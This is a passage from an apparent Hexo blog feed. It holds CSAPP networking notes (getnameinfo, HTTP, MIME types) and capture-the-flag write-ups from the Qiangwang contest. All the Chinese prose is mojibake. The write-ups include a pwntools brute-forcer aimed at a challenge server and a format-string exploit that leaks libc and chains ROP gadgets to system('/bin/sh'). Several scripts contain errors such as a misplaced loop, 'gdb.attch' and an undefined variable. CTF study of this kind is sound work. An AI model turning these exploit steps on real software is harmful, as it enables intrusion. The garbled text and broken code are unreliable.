è¡¨ç¤ºæ‰€æœ‰ç±»å‹éƒ½å¯ä»¥ã€‚</li><li><strong>ai_protocol</strong>ï¼šæœ‰ IPPROTO_TCPã€IPPROTO_UDP ç­‰ï¼Œè®¾ç½®ä¸º 0 è¡¨ç¤ºæ‰€æœ‰åè®®ã€‚</li></ul><h4 id="getnameinfo"><a href="#getnameinfo" class="headerlink" title="getnameinfo"></a>getnameinfo</h4><p>getnameinfo å‡½æ•°å’Œ getaddrinfo æ˜¯ç›¸åçš„ï¼Œå°†ä¸€ä¸ªå¥—æ¥å­—åœ°å€ç»“æ„è½¬æ¢æˆç›¸åº”çš„ä¸»æœºå’ŒæœåŠ¡åå­—ç¬¦ä¸²ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket .h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netdb.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">getnameinfo</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *sa, </span><br><span class="hljs-params">                <span class="hljs-type">socklen_t</span> salen,<span class="hljs-type">char</span> *host,</span><br><span class="hljs-params">                <span class="hljs-type">size_t</span> hostlen,<span class="hljs-type">char</span> *service, </span><br><span class="hljs-params">                <span class="hljs-type">size_t</span> servlen, <span class="hljs-type">int</span> flags)</span>;<br><span class="hljs-comment">//è¿”å›;å¦‚æœæˆåŠŸåˆ™ä¸º 0ï¼Œå¦‚æœé”™è¯¯åˆ™ä¸ºéé›¶çš„é”™è¯¯ä»£ç </span><br></code></pre></td></tr></table></figure><p>å‚æ•° sa æŒ‡å‘å¤§å°ä¸º salen å­—èŠ‚çš„å¥—æ¥å­—åœ°å€ç»“æ„ï¼Œhost æŒ‡å‘å¤§å°ä¸º hostlen å­—èŠ‚çš„ç¼“å†²åŒºï¼Œservice æŒ‡å‘å¤§å°ä¸º servlen å­—èŠ‚çš„ç¼“å†²åŒºã€‚</p><p>å¦‚æœä¸æƒ³è¦ä¸»æœºåï¼Œå¯ä»¥æŠŠ <em>host</em> è®¾ç½®ä¸º NULLï¼Œhostlen è®¾ç½®ä¸º 0ã€‚</p><p>å‚æ•° flags æ˜¯ä¸€ä¸ªä½æ©ç ï¼Œèƒ½å¤Ÿä¿®æ”¹é»˜è®¤çš„è¡Œä¸ºã€‚åŒæ ·å¯ä»¥æŠŠå„ç§å€¼ç”¨ OR ç»„åˆèµ·æ¥å¾—åˆ°è¯¥æ©ç ã€‚</p><ul><li>NI_NUMERICHOSTã€‚getnameinfo é»˜è®¤è¯•å›¾è¿”å› host ä¸­çš„åŸŸåã€‚è®¾ç½®è¯¥æ ‡å¿—ä¼š<br>ä½¿è¯¥å‡½æ•°è¿”å›ä¸€ä¸ªæ•°å­—åœ°å€å­—ç¬¦ä¸²ã€‚</li><li>NI_NUMERICSERVã€‚getnameinfo é»˜è®¤ä¼šæ£€æŸ¥ &#x2F;etc&#x2F;servicesï¼Œå¦‚æœå¯èƒ½ï¼Œä¼šè¿”å›æœåŠ¡åè€Œä¸æ˜¯ç«¯å£å·ã€‚è®¾ç½®è¯¥æ ‡å¿—ä¼šä½¿è¯¥å‡½æ•°è·³è¿‡æŸ¥æ‰¾ï¼Œç®€å•åœ°è¿”å›ç«¯å£å·ã€‚</li></ul><h1 id="Web-æœåŠ¡å™¨"><a href="#Web-æœåŠ¡å™¨" class="headerlink" title="Web æœåŠ¡å™¨"></a>Web æœåŠ¡å™¨</h1><h3 id="Web-åŸºç¡€"><a href="#Web-åŸºç¡€" class="headerlink" title="Web åŸºç¡€"></a>Web åŸºç¡€</h3><p>Web å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„äº¤äº’ç”¨çš„æ˜¯ä¸€ä¸ªåŸºäºæ–‡æœ¬çš„åº”ç”¨çº§åè®®ï¼Œå«åš HTTPï¼ˆè¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼‰ã€‚</p><p>Web å†…å®¹å¯ä»¥ç”¨ä¸€ç§å«åš HTMLï¼ˆè¶…æ–‡æœ¬æ ‡è®°è¯­è¨€ï¼‰çš„è¯­è¨€æ¥ç¼–å†™ã€‚</p><p>æˆ‘ä¹‹å‰æœ‰å­¦è¿‡ä¸€ç‚¹ HTMLï¼<a href="%5Bhttps://shmodifier.github.io/2023/12/25/HTML%E8%B6%85%E6%96%87%E6%9C%AC%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/">è¿™é‡Œï¼</a></p><h3 id="Web-å†…å®¹"><a href="#Web-å†…å®¹" class="headerlink" title="Web å†…å®¹"></a>Web å†…å®¹</h3><p>å¯¹äº Web å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨è€Œè¨€ï¼Œ<strong>å†…å®¹</strong>æ˜¯ä¸ä¸€ä¸ª <strong>MIME</strong>ï¼ˆMultipurpose Internet Mail Extensionsï¼Œå¤šç”¨é€”çš„ç½‘é™…é‚®ä»¶æ‰©å……åè®®ï¼‰ç±»å‹ç›¸å…³çš„å­—èŠ‚åºåˆ—ã€‚</p><p>ä¸‹è¡¨å±•ç¤ºäº†ä¸€äº›å¸¸ç”¨çš„ MIME ç±»å‹ã€‚</p><table><thead><tr><th>MIMEç±»å‹</th><th>æè¿°</th></tr></thead><tbody><tr><td>text&#x2F;html</td><td>HTML é¡µé¢</td></tr><tr><td>text&#x2F;plain</td><td>æ— æ ¼å¼æ–‡æœ¬</td></tr><tr><td>application&#x2F;postscript</td><td>Postscript æ–‡æ¡£</td></tr><tr><td>image&#x2F;gif</td><td>GIF æ ¼å¼ç¼–ç çš„äºŒè¿›åˆ¶å›¾åƒ</td></tr><tr><td>image&#x2F;png</td><td>PNG æ ¼å¼ç¼–ç çš„äºŒè¿›åˆ¶å›¾åƒ</td></tr><tr><td>image&#x2F;jpeg</td><td>JPEG æ ¼å¼ç¼–ç çš„äºŒè¿›åˆ¶å›¾åƒ</td></tr></tbody></table><p>Web æœåŠ¡å™¨ä»¥ä¸¤ç§ä¸åŒçš„æ–¹å¼å‘å®¢æˆ·ç«¯æä¾›å†…å®¹ï¼š</p><ul><li>å–ç£ç›˜æ–‡ä»¶è¿”å›ï¼Œå¹¶å°†å®ƒçš„å†…å®¹è¿”å›ç»™å®¢æˆ·ç«¯ã€‚ç£ç›˜æ–‡ä»¶ç§°ä¸ºé™æ€å†…å®¹ï¼Œè€Œè¿”å›æ–‡ä»¶ç»™å®¢æˆ·ç«¯çš„è¿‡ç¨‹ç§°ä¸ºæœåŠ¡é™æ€å†…å®¹ã€‚</li><li>è¿è¡Œä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¹¶å°†å®ƒçš„è¾“å‡ºè¿”å›ç»™å®¢æˆ·ç«¯ã€‚è¿è¡Œæ—¶å¯æ‰§è¡Œæ–‡ä»¶äº§ç”Ÿçš„è¾“å‡ºç§°ä¸ºåŠ¨æ€å†…å®¹ï¼Œè€Œè¿è¡Œç¨‹åºå¹¶è¿”å›å®ƒçš„è¾“å‡ºåˆ°å®¢æˆ·ç«¯çš„è¿‡ç¨‹ç§°ä¸ºæœåŠ¡åŠ¨æ€å†…å®¹ã€‚</li></ul><p>æ¯æ¡ç”± Web æœåŠ¡å™¨è¿”å›çš„å†…å®¹éƒ½æ˜¯å’Œ URLï¼ˆUniversal Resource Locatorï¼Œé€šç”¨èµ„æºå®šä½ç¬¦ï¼‰æœ‰å…³çš„ã€‚ä¾‹å¦‚ï¼š</p><p>ä¾‹å¦‚ï¼Œ<a href="http://www.google.com/index.html">http://www.google.com:80/index.html</a></p><p>æŠŠ URL è¿›è¡Œæ‹†åˆ†å…¶å®èƒ½å¾—åˆ°ä»¥ä¸‹ç»“æ„ç»„æˆï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">protcol:<span class="hljs-regexp">//</span>host:port<span class="hljs-regexp">/router/</span>?arg1&amp;arg2<br></code></pre></td></tr></table></figure><ul><li>protcolï¼šåè®®ç±»å‹</li><li>hostï¼šä¸»æœºåœ°å€</li><li>portï¼šç«¯å£</li><li>routerï¼šè·¯ç”±</li><li>arg1&amp;arg2ï¼šurl å‚æ•°</li></ul><h3 id="HTTP-äº‹åŠ¡"><a href="#HTTP-äº‹åŠ¡" class="headerlink" title="HTTP äº‹åŠ¡"></a>HTTP äº‹åŠ¡</h3><p>å¯ä»¥ä½¿ç”¨ TELNET å»è¿æ¥ä¸€ä¸ª WEB æœåŠ¡å™¨ï¼Œå¹¶å‘èµ·è¯·æ±‚ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/11-TELNET.png"></p><h4 id="HTTP-è¯·æ±‚"><a href="#HTTP-è¯·æ±‚" class="headerlink" title="HTTP è¯·æ±‚"></a>HTTP è¯·æ±‚</h4><p>ä¸ªHTTP è¯·æ±‚çš„ç»„æˆæ˜¯è¿™æ ·çš„ï¼šä¸€ä¸ª<strong>è¯·æ±‚è¡Œï¼ˆrequest lineï¼‰</strong>ï¼Œåé¢è·Ÿéšé›¶ä¸ªæˆ–æ›´å¤šä¸ª<strong>è¯·æ±‚æŠ¥å¤´ï¼ˆrequest headerï¼‰</strong>ï¼Œå†è·Ÿéšä¸€ä¸ªç©ºçš„æ–‡æœ¬è¡Œæ¥ç»ˆæ­¢æŠ¥å¤´åˆ—è¡¨ã€‚ä¸€ä¸ªè¯·æ±‚è¡Œçš„å½¢å¼æ˜¯ <strong>method URI version</strong>ã€‚</p><p>HTTP æ”¯æŒè®¸å¤šä¸åŒçš„æ–¹æ³•ï¼ŒåŒ…æ‹¬ GETã€POSTã€OPTIONSã€HEADã€PUTã€DELETE å’Œ TRACEã€‚æˆ‘ä»¬å°†åªè®¨è®ºå¹¿ä¸ºåº”ç”¨çš„ GET æ–¹æ³•ï¼Œå¤§å¤šæ•° HTTP è¯·æ±‚éƒ½æ˜¯è¿™ç§ç±»å‹çš„ã€‚GET æ–¹æ³•æŒ‡å¯¼æœåŠ¡å™¨ç”Ÿæˆå’Œè¿”å› <strong>URI</strong>ï¼ˆUniform Resource Identifierï¼Œç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦ï¼‰æ ‡è¯†çš„å†…å®¹ã€‚URI æ˜¯ç›¸åº”çš„ URL çš„åç¼€ï¼ŒåŒ…æ‹¬æ–‡ä»¶åå’Œå¯é€‰çš„å‚æ•°ã€‚</p><h4 id="HTTP-å“åº”"><a href="#HTTP-å“åº”" class="headerlink" title="HTTP å“åº”"></a>HTTP å“åº”</h4><p>HTTP å“åº”å’Œ HTTP è¯·æ±‚æ˜¯ç›¸ä¼¼çš„ã€‚ä¸€ä¸ª HTTP å“åº”çš„ç»„æˆæ˜¯è¿™æ ·çš„ï¼šä¸€ä¸ª<strong>å“åº”è¡Œ</strong>ï¼ˆresponse lineï¼‰ï¼Œåé¢è·Ÿéšç€é›¶ä¸ªæˆ–æ›´å¤šçš„<strong>å“åº”æŠ¥å¤´</strong>ï¼ˆresponse headerï¼‰ï¼Œå†è·Ÿéšä¸€ä¸ªç»ˆæ­¢æŠ¥å¤´çš„ç©ºè¡Œï¼Œå†è·Ÿéšä¸€ä¸ª<strong>å“åº”ä¸»ä½“</strong>ï¼ˆresponse bodyï¼‰ã€‚ä¸€ä¸ªå“åº”è¡Œçš„æ ¼å¼æ˜¯ <strong>version status-code status-message</strong>ã€‚</p><p>version å­—æ®µæè¿°çš„æ˜¯å“åº”æ‰€éµå¾ªçš„ HTTP ç‰ˆæœ¬ã€‚<strong>çŠ¶æ€ç </strong>ï¼ˆstatus-codeï¼‰æ˜¯ä¸€ä¸ª 3 ä½çš„æ­£æ•´æ•°ï¼ŒæŒ‡æ˜å¯¹è¯·æ±‚çš„å¤„ç†ã€‚çŠ¶æ€æ¶ˆæ¯ï¼ˆstatus messageï¼‰ç»™å‡ºä¸é”™è¯¯ä»£ç ç­‰ä»·çš„è‹±æ–‡æè¿°ã€‚ä¸‹è¡¨åˆ—å‡ºäº†ä¸€äº›å¸¸è§çš„çŠ¶æ€ç ï¼Œä»¥åŠå®ƒä»¬ç›¸åº”çš„æ¶ˆæ¯ã€‚</p><table><thead><tr><th>çŠ¶æ€ä»£ç </th><th>çŠ¶æ€æ¶ˆæ¯</th><th>æè¿°</th></tr></thead><tbody><tr><td>200</td><td>æˆåŠŸ</td><td>å¤„ç†è¯·æ±‚æ— è¯¯</td></tr><tr><td>301</td><td>æ°¸ä¹…ç§»åŠ¨</td><td>å†…å®¹å·²ç§»åŠ¨åˆ° location å¤´ä¸­æŒ‡æ˜çš„ä¸»æœºä¸Š</td></tr><tr><td>400</td><td>é”™è¯¯è¯·æ±‚</td><td>æœåŠ¡å™¨ä¸èƒ½ç†è§£è¯·æ±‚</td></tr><tr><td>403</td><td>ç¦æ­¢</td><td>æœåŠ¡å™¨æ— æƒè®¿é—®æ‰€è¯·æ±‚çš„æ–‡ä»¶</td></tr><tr><td>404</td><td>æœªå‘ç°</td><td>æœåŠ¡å™¨ä¸èƒ½æ‰¾åˆ°æ‰€è¯·æ±‚çš„æ–‡ä»¶</td></tr><tr><td>501</td><td>æœªå®ç°</td><td>æœåŠ¡å™¨ä¸æ”¯æŒè¯·æ±‚çš„æ–¹æ³•</td></tr><tr><td>505</td><td>HTTP ç‰ˆæœ¬ä¸æ”¯æŒ</td><td>æœåŠ¡å™¨ä¸æ”¯æŒè¯·æ±‚çš„ç‰ˆæœ¬</td></tr></tbody></table><hr><p>åˆæ˜¯ä¸€ä¸ªèŠ‚æ—¥ï¼Œç¡ä¸å“åˆå’Œå°ä¼™ä¼´ä¸€èµ·ğŸ¥¹</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/%E7%9D%A1%E4%B8%8D%E5%8D%93.jpg"></p><p>æ€ªå¥½ç¬‘çš„ğŸ˜…</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/11-%E5%88%98%E6%B3%A2.png"></p>]]></content>
    
    
    <categories>
      
      <category>è¯»ä¹¦ç¬”è®°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åˆ·é¢˜è¿›è¡Œä¸­</title>
    <link href="/2023/12/18/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/"/>
    <url>/2023/12/18/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/</url>
    
    <content type="html"><![CDATA[<p>æŒç»­æ›´æ–°</p><span id="more"></span><h1 id="å¼ºç½‘"><a href="#å¼ºç½‘" class="headerlink" title="å¼ºç½‘"></a>å¼ºç½‘</h1><h3 id="easyfuzz"><a href="#easyfuzz" class="headerlink" title="easyfuzz"></a>easyfuzz</h3><blockquote><p>å½“æ—¶è¿˜åšäº†ä¸€ä¸ª Misc å˜»å˜»</p></blockquote><p>å®ƒæœ€å¤šè¾“å…¥ 10byte å°±æ˜¯è¯´</p><p>ä¸€å¼€å§‹æˆ‘å°±ç–¯ç‹‚æ‰‹åŠ¨å°è¯•ï¼Œå‘ç°è¾“å…¥ä¹ä½å­—ç¬¦çš„æ—¶å€™ä¼šè¢«è¦†ç›–æˆ 110000000ï¼Œå…¶ä»–æƒ…å†µä¸ç®¡æ€ä¹ˆè¾“å…¥éƒ½æ˜¯ä¹ä¸ªé›¶</p><p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/Snipaste_2023-12-16_10-28-32.png"></p><p>åˆå°è¯•èƒ¡ä¹±æ‰“äº†å‡ ä¸‹å‘ç°åŒæ˜¯ä¹ä½ï¼Œè¾“å…¥ <code>asdf&#39;fdd</code> å°±å¯ä»¥è¦†ç›–æœ€é«˜ä½çš„ 0 äº†å¥½ç¥å¥‡</p><p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/Snipaste_2023-12-16_10-47-30.png"></p><p>åˆåˆå†æ¬¡å¤šæ¬¡å°è¯•å‘ç°æœ€åä¸€ä½æ˜¯ dï¼Œå¯¹åº”çš„æœ€åä¸€ä½å°±æ˜¯1ã€‚åŒæ—¶åªè¦è¾“å…¥æ˜¯ä¹ä½ï¼Œä¸ç®¡è¾“å…¥çš„å‰ä¸¤ä½æ€ä¹ˆå˜ï¼Œè¦†ç›–ç‡å‰ä¸¤ä½éƒ½æ˜¯11ã€‚</p><p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/Snipaste_2023-12-16_11-02-56.png"></p><p>æ‰€ä»¥è¯´è¦†ç›–ç‡åä¸ƒä½å’Œè¾“å…¥çš„åä¸ƒä½ä¸€ä¸€å¯¹åº”ã€‚è¯¯æ‰“è¯¯æ’çŸ¥é“æœ€åä¸€ä½æ˜¯dï¼Œé‚£æˆ‘ä»¬åªéœ€è¦çˆ†ç ´ä¸€ä¸‹ä¸­é—´çš„å…­ä½å°±è¡Œã€‚</p><p>ç»¼ä¸Šï¼Œæˆ‘ä»¬åªè¦ä¿è¯ä¸€å…±è¾“å…¥ä¹ä½ï¼Œæœ€åä¸€ä½æ˜¯dã€‚åªéœ€è¦å°è¯•æšä¸¾å¯¹åº”ä½å€¼ä¸º0çš„ä½ï¼Œå¯¹åº”ä½æ˜¯1ï¼Œé‚£ä¹ˆå°±æ˜¯å·²ç»æ‰¾åˆ°äº†æ­£ç¡®çš„å€¼ä¸éœ€è¦æ”¹å˜äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> printable<br>io.remote(<span class="hljs-string">&#x27;101.200.122.251&#x27;</span>, <span class="hljs-number">12188</span>)<br><br>cover=[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>]<br>payload=<span class="hljs-built_in">bytearray</span>(<span class="hljs-string">b&#x27;aaaaaaaad&#x27;</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;bytes): &#x27;</span>)<br>i=<span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">if</span> i&gt;=<span class="hljs-built_in">len</span>(printable):<br>        i=i-<span class="hljs-built_in">len</span>(printable)<br>    ch=printable[i]<br>    j=cover.index(<span class="hljs-number">0</span>)<br>    payload[j]=<span class="hljs-built_in">ord</span>(ch)<br>    io.sendline(payload)<br>    io.recvuntil(<span class="hljs-string">b&#x27;coverage: &#x27;</span>)<br>    received_data = io.recvline().strip().decode()<br>cover = []<br><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> received_data:<br>    cover.append(<span class="hljs-built_in">int</span>(item))<br>    <span class="hljs-keyword">if</span> cover.count(<span class="hljs-string">&#x27;1&#x27;</span>)==<span class="hljs-number">9</span>:<br>        <span class="hljs-keyword">break</span><br>io.interactive()<br></code></pre></td></tr></table></figure><p>æœ€åå°±æš´åŠ›ç ´è§£å‡ºæ¥æ˜¯ <code>xxqwbGood</code> å°±å¯ä»¥è®©æ‰€æœ‰çš„ä½éƒ½æ˜¯0ã€‚</p><h3 id="ez-fmt"><a href="#ez-fmt" class="headerlink" title="ez_fmt"></a>ez_fmt</h3><blockquote><p>å°±ä¼šè¿™ä¸€é“ï¼ˆx</p></blockquote><p>æ²¡æœ‰ PIE ä¿æŠ¤å…¶ä»–çš„éƒ½å¼€äº†ï¼Œè¿›å»ä¸€çœ¼å°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä½†æ˜¯åŸé¢˜ç›®ä¸­çš„æ¼æ´åªèƒ½åˆ©ç”¨ä¸€æ¬¡ã€‚</p><p>å› ä¸º 64 ä½æœ‰å‰ 6 ä½çš„å¯„å­˜å™¨ä¼ å‚æ‰€ä»¥ buf æ˜¯ç¬¬ 11 ä¸ªå‚æ•°ã€‚</p><p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/ez_fmt_main.png"></p><p>åˆ©ç”¨æ€è·¯ï¼š</p><ul><li><p>é¦–å…ˆéœ€è¦åŠ«æŒæ§åˆ¶æµè®©ç¨‹åºå¤šæ¬¡åˆ©ç”¨æ¼æ´ã€‚</p></li><li><p>é‡Œé¢æ²¡æœ‰ç°æˆçš„åé—¨å‡½æ•°å¯ä»¥åˆ©ç”¨ï¼Œè¦æ‰‹åŠ¨æ„é€  ROP gadget ã€‚</p></li></ul><p>é¦–å…ˆæˆ‘ä»¬è¦è€ƒè™‘å¦‚ä½•å¤šæ¬¡åˆ©ç”¨è¿™ä¸ªå­—ç¬¦ä¸²æ¼æ´ã€‚ç”±äº read çš„è¾“å…¥é™åˆ¶ï¼Œæˆ‘ä»¬æ²¡æœ‰åŠæ³•é€šè¿‡æº¢å‡ºæ¥æ”¹å˜ main å‡½æ•°çš„è¿”å›åœ°å€ã€‚</p><p>åœ¨ gdb ä¸­å¯ä»¥å‘ç°â€”â€”rsp æŒ‡å‘ <code>buf-8</code> çš„ä½ç½®ï¼Œä¹Ÿå°±æ˜¯ read çš„è¿”å›åœ°å€</p><p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/ez_fmt_ret.png"></p><p>å½“ç„¶åœ¨ printf ä¸­ä¹Ÿä¸€æ ·ï¼Œ<strong>æ ˆä¸Šæ–¹æ˜¯å½“å‰å­å‡½æ•°çš„è¿”å›åœ°å€ï¼Œæ ˆçš„ä¸‹æ–¹æ˜¯æ•´ä¸ª main å‡½æ•°çš„è¿”å›åœ°å€ã€‚</strong></p><p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/ez_fmt_ret2.png"></p><p>å› ä¸ºæˆ‘ä»¬å·²çŸ¥ buf çš„åœ°å€ï¼Œæ‰€ä»¥è¿™æ ·æˆ‘ä»¬å°±èƒ½å¤Ÿè®© printf åŠ«æŒè‡ªå·±çš„åœ°å€ï¼Œä»è€Œå›åˆ° read å¤šæ¬¡åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚</p><p>æˆ‘ä»¬ä»¥æ§åˆ¶ printf å‡½æ•°è¿”å›åˆ° csu_init çš„ gadget çš„ä½ç½®ï¼Œç„¶åç»è¿‡ä¸‰æ¬¡å‡ºæ ˆæ“ä½œï¼Œrsp æŒ‡å‘ <code>buf + 0x18</code>ï¼ˆæ¯æ¬¡ <code>pop</code> +8ï¼‰ ï¼Œæ‰§è¡Œ ret ã€‚<code>buf + 0x18</code> çš„å€¼ä¹Ÿæ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¿®æ”¹å®ƒåˆ°æ‰§è¡Œ read å‡½æ•°çš„åœ°å€ã€‚å…¶ä¸­ 0-0x18 ä¸­é—´çš„ç©ºéš™æˆ‘ä»¬ç”¨æ— æ„ä¹‰çš„å­—ç¬¦å¡«å……å°±å¥½ã€‚</p><p>è¿™æ ·ç¨‹åºæµç¨‹å°±å˜æˆäº† <code>printf(buf) -&gt; gadget -&gt; read(0, buf,0x30)</code>ã€‚</p><p>å› ä¸º <code>printf(buf)</code> çš„åœ°å€ <code>0x40122D</code> å’Œ csu_init åœ°å€ <code>0x4012CE</code>ä»…æœ‰ä½å­—èŠ‚ä¸åŒï¼Œæ‰€ä»¥åªéœ€è¦ä¿®æ”¹ä½å­—èŠ‚ã€‚</p><p>æ³„éœ²åœ°å€å’Œä¿®æ”¹åœ°å€çš„æ“ä½œå¯ä»¥åŒæ—¶å®Œæˆã€‚æˆ‘ä»¬é€šè¿‡è§‚å¯Ÿæ ˆå¯ä»¥è®¡ç®—å‡º <code>__lic_start_call_main</code> çš„åç§»ä¸º  19</p><p><img src="/img/%E5%88%B7%E9%A2%98%E8%BF%9B%E8%A1%8C%E4%B8%AD/ez_fmt_%E5%81%8F%E7%A7%BB.png"></p><p>æ¥ä¸‹æ¥ç›´æ¥åœ¨ read é‡Œæ„é€  ROP é“¾å°±è¡Œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io = process(<span class="hljs-string">&quot;./ez_fmt&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br><br>pop_rdi = <span class="hljs-number">0x04012d3</span><br>read_addr=<span class="hljs-number">0x0401205</span><br>bin_sh = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br>system = libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>io.recvuntil(<span class="hljs-string">b&#x27;There is a gift for you &#x27;</span>)<br>gift = <span class="hljs-built_in">int</span>(io.recvline(), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(gift)<br><br>payload = <span class="hljs-string">&quot;%&#123;0xce&#125;c%10$hhn%19$p&quot;</span>.ljust(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;A&#x27;</span>).encode()+p64(read_addr)+p64(gift-<span class="hljs-number">0x8</span>)<br>io.send(payload)<br>gdb.attch(io)<br>io.recvuntil(<span class="hljs-string">&#x27;0x&#x27;</span>)<br><br>libc_base = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - (libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]+<span class="hljs-number">128</span>)<br><span class="hljs-built_in">print</span>(libc_addr)<br><br>payload=flat(<br>    &#123;<br>        <span class="hljs-number">0x18</span>:p64(pop_rdi)+p64(libc_base+bin_sh)+p64(libc_base+system)<br>    &#125;<br>)<br><br>io.send(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><blockquote><p>å­¦ä¼šäº†ä¸ªè¯­æ³•ç”¨å­—å…¸æ¥å¡«å……å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">flat<br>(<br>    &#123;<br>        <span class="hljs-number">0</span>:<span class="hljs-string">&quot;%&#123;&#125;c%11$hhn%19$p&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">0xce</span>)<br>        <span class="hljs-number">0x18</span>:p64(read_addr)+p64(gift-<span class="hljs-number">0x8</span>)<br>    &#125;<br>)<br></code></pre></td></tr></table></figure><p><code>flat()</code> å‡½æ•°ç”¨äºå°†å¤šä¸ªå˜é‡æ‰“åŒ…æˆäºŒè¿›åˆ¶æ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œå­—å…¸éƒ¨åˆ† <code>&#123;x:&quot;&quot;&#125;</code> ï¼Œæ„å‘³ä» åç§»ä¸º x 